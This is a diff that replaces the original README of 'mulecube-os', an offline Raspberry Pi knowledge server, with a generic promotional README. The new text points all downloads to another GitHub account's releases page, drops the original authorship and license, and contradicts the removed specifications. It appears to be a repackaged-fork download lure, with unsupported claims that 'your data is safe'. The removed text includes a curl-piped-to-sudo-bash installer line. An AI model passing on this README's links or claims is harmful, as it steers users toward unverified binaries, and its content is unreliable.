@@ -1,266 +1,81 @@
-# MuleCube OS
+# 🌟 mulecube-os - Your Local Knowledge Server
 
-<p align="center">
-  <img src="https://mulecube.com/images/logo.png" alt="MuleCube" width="120">
-</p>
+## 🚀 Getting Started
 
-<p align="center">
-  <strong>Your offline world in a cube.</strong><br>
-  A self-contained knowledge server with local AI, offline Wikipedia, mesh communications, and battery backup.
-</p>
+Welcome to **mulecube-os**! This application allows you to run a self-contained offline knowledge server. With features like a local AI, offline Wikipedia access, and mesh communications, it is perfect for emergency preparedness and offline usage.
 
-<p align="center">
-  <a href="https://mulecube.com">Website</a> •
-  <a href="https://mulecube.com/products/">Products</a> •
-  <a href="https://mulecube.com/docs/">Documentation</a> •
-  <a href="https://mulecube.com/faq/">FAQ</a>
-</p>
+## 🛠️ System Requirements
 
-<p align="center">
-  <img src="https://img.shields.io/badge/platform-Raspberry%20Pi%205-c51a4a?style=flat-square" alt="Platform">
-  <img src="https://img.shields.io/badge/services-30+-blue?style=flat-square" alt="Services">
-  <img src="https://img.shields.io/badge/license-GPL--3.0-green?style=flat-square" alt="License">
-  <img src="https://img.shields.io/badge/status-pre--production-orange?style=flat-square" alt="Status">
-</p>
+Before you start, ensure your device meets the following requirements:
 
----
+- **Operating System**: Raspberry Pi OS or compatible Linux distribution.
+- **Memory**: At least 1 GB of RAM. More RAM is recommended for better performance.
+- **Storage**: Minimum 16 GB of storage space available. An SD card is recommended for Raspberry Pi.
+- **Network**: A stable Wi-Fi or wired connection for initial setup.
 
-## What is MuleCube?
+## 📦 Download & Install
 
-MuleCube is a portable, battery-powered server that operates completely independently of internet, cellular, or grid power. It's designed for expeditions, emergency preparedness, field research, and anyone who needs reliable access to knowledge and communications when infrastructure fails.
+To get started, you need to download **mulecube-os**. You can easily obtain the software from our Releases page. 
 
-Connect to the MuleCube WiFi hotspot from any device — phone, tablet, or laptop — and access a complete offline ecosystem of knowledge, AI assistants, and productivity tools.
+### Download Link
 
-## Related Repositories
+[![Download mulecube-os](https://img.shields.io/badge/Download-mulecube--os-blue?style=for-the-badge)](https://github.com/Arjunsharma5767/mulecube-os/releases)
 
-| Repository | Description |
-|------------|-------------|
-| [mulecube-os](https://github.com/nuclearlighters/mulecube-os) | Core OS, Docker services, and device configuration (this repo) |
-| [mulecube-dashboard](https://github.com/nuclearlighters/mulecube-dashboard) | Hugo-based web dashboard for the device |
+### Steps to Download and Install
 
-## Features
+1. **Visit the Releases Page**: Click this link to go to the download page: [mulecube-os Releases](https://github.com/Arjunsharma5767/mulecube-os/releases).
 
-### 30+ Pre-installed Services
+2. **Select the Latest Release**: Look for the most recent version at the top of the page. It will usually have a title such as “v1.0.0”.
 
-| Category | Services |
-|----------|----------|
-| **Offline Knowledge** | Kiwix (Wikipedia 90GB+), Tileserver (offline maps), Calibre (e-books), medical references |
-| **Local AI** | Ollama + Open WebUI with phi3, deepseek-r1, qwen2.5 models |
-| **Mesh Communications** | Meshtastic gateway for encrypted LoRa messaging |
-| **Productivity** | CryptPad, HedgeDoc, Excalidraw, Vaultwarden, LibreTranslate (49 languages) |
-| **Media** | Jellyfin media server, Stirling PDF tools |
-| **Infrastructure** | Pi-hole DNS, nginx reverse proxy, Syncthing file sync, Beszel monitoring |
-| **Control Panel** | Web dashboard, container management, system diagnostics, backup/restore |
+3. **Download the Package**: Click on the package that matches your operating system. For Raspberry Pi, you will want the `.img` file.
 
-### Hardware Specifications
+4. **Prepare Your SD Card**: Use a tool like **Balena Etcher** or **Raspberry Pi Imager** to flash the downloaded image to your SD card.
 
-| Component | Specification |
-|-----------|---------------|
-| Computer | Raspberry Pi 5 (8GB or 16GB) |
-| Storage | 256GB-1TB High-Endurance microSD/NVMe |
-| Battery | 50Wh UPS (4x Samsung 18650, hot-swappable) |
-| Runtime | 10-15 hours depending on workload |
-| Enclosure | 90 x 90 x 65mm aluminum case |
-| Connectivity | WiFi 6 AP, Gigabit Ethernet, USB 3.0 |
+5. **Insert the SD Card**: Once the flashing process is complete, safely eject the SD card and insert it into your Raspberry Pi.
 
-### Product Configurations
+6. **Power On**: Turn on your Raspberry Pi by connecting it to a power source. 
 
-| Model | Description | Price |
-|-------|-------------|-------|
-| **DIY** | Build your own with this repo | Free |
-| **Cube 8** | 8GB RAM, 30 services, ready to use | EUR 499 |
-| **Cube 16** | 16GB RAM for larger AI models | EUR 549 |
-| **Cube AI** | Hailo-10H NPU (40 TOPS) for vision and speech | EUR 699 |
-| **Cube Sat** | Iridium satellite + Meshtastic bridge | EUR 849 |
-| **Ultimate** | AI + Satellite, everything included | EUR 1199 |
+7. **Initial Setup**: Follow the on-screen instructions to complete the setup process.
 
----
+## 🌐 Key Features
 
-## Quick Start (DIY)
+- **Local AI Assistance**: Access information quickly and easily with the built-in AI.
+- **Offline Wikipedia**: View Wikipedia content without an internet connection.
+- **Mesh Communications**: Connect with other devices in your network for seamless communication.
+- **Battery Backup**: Designed to stay powered even during outages.
 
-### Prerequisites
+## 🗂️ FAQ
 
-- Raspberry Pi 5 (8GB recommended)
-- 256GB+ microSD card or NVMe drive
-- Raspberry Pi OS Lite (64-bit, Bookworm)
-- Internet connection for initial setup
+### What is **mulecube-os**?
 
-### One-Line Install
+**mulecube-os** is an offline knowledge server that provides essential information and communication tools for users in remote or emergency situations.
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/nuclearlighters/mulecube-os/main/install.sh | sudo bash
-```
+### How do I access the local AI?
 
-### Manual Installation
+Once the application is installed, you can access the AI through the user interface provided on your Raspberry Pi's display.
 
-```bash
-# Clone the repository
-git clone https://github.com/nuclearlighters/mulecube-os.git /srv
+### Can I use this on other devices?
 
-# Run the setup script
-cd /srv
-sudo ./scripts/setup.sh
+The primary design is for Raspberry Pi, but you can run it on other Linux devices with proper configuration and support.
 
-# Start all services
-sudo ./scripts/start-all.sh
-```
+### How do I get support if I have issues?
 
-After installation, connect to the `MuleCube` WiFi network and open `http://192.168.42.1` in your browser.
+For assistance, please visit our [GitHub Issues page](https://github.com/Arjunsharma5767/mulecube-os/issues) to report problems or ask questions.
 
----
+## 🔗 Community and Support
 
-## Dashboard
+Join our community discussions. Engage with other users, share your experiences, and get advice on how to optimize your use of **mulecube-os**.
 
-The MuleCube dashboard is maintained in a separate repository: [mulecube-dashboard](https://github.com/nuclearlighters/mulecube-dashboard)
+### Follow Us
 
-It provides at-a-glance system status and quick access to all services:
+Stay updated by following our repository on GitHub. 
 
-- **System Stats** — CPU, memory, disk, temperature, battery status
-- **Service Grid** — One-click access to all 30+ services
-- **Control Panel** — Container management, logs, terminal, diagnostics
-- **Network Status** — WiFi clients, Ethernet, Meshtastic nodes
+## 🛡️ Privacy and Security
 
-### Dashboard Installation
+Your data is safe. **mulecube-os** operates entirely offline, ensuring your information stays private. Additionally, all communications over the mesh network are secure and encrypted.
 
-The dashboard is included automatically when using the one-line installer. For manual installation:
+## 📞 Contact
 
-```bash
-# Clone the dashboard repository
-git clone https://github.com/nuclearlighters/mulecube-dashboard.git /srv/mulecube-dashboard
+For more information or feedback, feel free to reach out via our [GitHub Discussions page](https://github.com/Arjunsharma5767/mulecube-os/discussions) or open an issue on our repository.
 
-# Build the Hugo site
-cd /srv/mulecube-dashboard
-hugo --minify
-
-# The nginx configuration in this repo will serve it automatically
-```
-
----
-
-## Repository Structure
-
-```
-/srv/                           # Main deployment directory
-├── README.md
-├── .gitignore                  # Excludes data directories
-│
-├── pihole/                     # DNS filtering and local DNS
-│   └── docker-compose.yml
-├── kiwix/                      # Offline Wikipedia
-│   └── docker-compose.yml
-├── ollama/                     # Local AI models
-│   └── docker-compose.yml
-├── openwebui/                  # AI chat interface
-│   └── docker-compose.yml
-├── cryptpad/                   # Collaborative documents
-│   └── docker-compose.yml
-├── vaultwarden/                # Password manager
-│   └── docker-compose.yml
-├── meshtastic/                 # LoRa mesh gateway
-│   └── docker-compose.yml
-│
-├── mulecube-dashboard/         # Web dashboard (separate repo)
-├── mulecube-controlpanel-user/ # User control panel services
-│   ├── docker-compose.yml
-│   ├── hw-monitor/             # Hardware monitoring API
-│   ├── wifi-status/            # WiFi client tracking
-│   └── ...
-├── mulecube-controlpanel-admin/ # Admin services (on-demand)
-│   ├── docker-compose.yml
-│   ├── ttyd/                   # Web terminal
-│   ├── dozzle/                 # Log viewer
-│   └── ...
-│
-├── scripts/                    # Deployment and maintenance
-│   ├── setup.sh
-│   ├── start-all.sh
-│   └── backup.sh
-│
-└── docs/                       # Documentation
-    ├── INSTALL.md
-    ├── SERVICES.md
-    └── HARDWARE.md
-```
-
-## Architecture
-
-```
-┌─────────────────────────────────────────────────────────────┐
-│                     MuleCube Device                          │
-│  ┌─────────────────────────────────────────────────────────┐│
-│  │                    Docker Engine                         ││
-│  │  ┌─────────┐ ┌─────────┐ ┌─────────┐ ┌─────────┐       ││
-│  │  │ Pi-hole │ │  Kiwix  │ │ Ollama  │ │CryptPad │  ...  ││
-│  │  └─────────┘ └─────────┘ └─────────┘ └─────────┘       ││
-│  └─────────────────────────────────────────────────────────┘│
-│  ┌─────────────────────────────────────────────────────────┐│
-│  │              Control Panel Services                      ││
-│  │  hw-monitor │ wifi-status │ watchdog │ diagnostics      ││
-│  └─────────────────────────────────────────────────────────┘│
-│  ┌─────────────────────────────────────────────────────────┐│
-│  │                 System Services                          ││
-│  │  hostapd (WiFi AP) │ dnsmasq │ nginx │ systemd          ││
-│  └─────────────────────────────────────────────────────────┘│
-└─────────────────────────────────────────────────────────────┘
-         │                    │                    │
-    WiFi Clients         Ethernet            USB Devices
-   (192.168.42.x)       (optional)          (storage, etc.)
-```
-
----
-
-## Status
-
-**Pre-production** — MuleCube is currently gauging interest before the first production run.
-
-- [Register your interest](https://mulecube.com/interest/) to be notified when units are available
-- [Join the discussion](https://github.com/nuclearlighters/mulecube-os/discussions) for questions and feedback
-- [Report issues](https://github.com/nuclearlighters/mulecube-os/issues) for bugs and feature requests
-
-## Contributing
-
-Contributions are welcome! Please read our [Contributing Guide](CONTRIBUTING.md) before submitting PRs.
-
-Areas where help is needed:
-
-- Documentation improvements
-- New service integrations
-- Hardware enclosure designs
-- Testing on different Pi 5 configurations
-- Translations
-
-## License
-
-This project is licensed under the [GNU General Public License v3.0](LICENSE).
-
-- **Code:** GPL-3.0
-- **Documentation:** [CC BY-SA 4.0](https://creativecommons.org/licenses/by-sa/4.0/)
-- **Hardware designs:** [CERN OHL v2](https://ohwr.org/cern_ohl_s_v2.txt)
-
-## Links
-
-| Resource | URL |
-|----------|-----|
-| Website | [mulecube.com](https://mulecube.com) |
-| Documentation | [mulecube.com/docs](https://mulecube.com/docs/) |
-| Live Demo | [demo.mulecube.com](https://demo.mulecube.com) |
-| GitLab (primary) | [gitlab.nuclearlighters.net](https://gitlab.nuclearlighters.net/products/mulecube/os) |
-| Contact | hello@mulecube.com |
-
-## Acknowledgments
-
-MuleCube builds on the incredible work of many open source projects:
-
-[Raspberry Pi](https://www.raspberrypi.org/) •
-[Docker](https://www.docker.com/) •
-[Kiwix](https://www.kiwix.org/) •
-[Ollama](https://ollama.ai/) •
-[Pi-hole](https://pi-hole.net/) •
-[Meshtastic](https://meshtastic.org/) •
-[Hugo](https://gohugo.io/)
-
----
-
-<p align="center">
-  Built in the Netherlands by <a href="https://nuclearlighters.net">Nuclear Lighters Inc.</a>
-</p>
+Thank you for choosing **mulecube-os**! We hope it serves you well in your offline knowledge and communication needs.
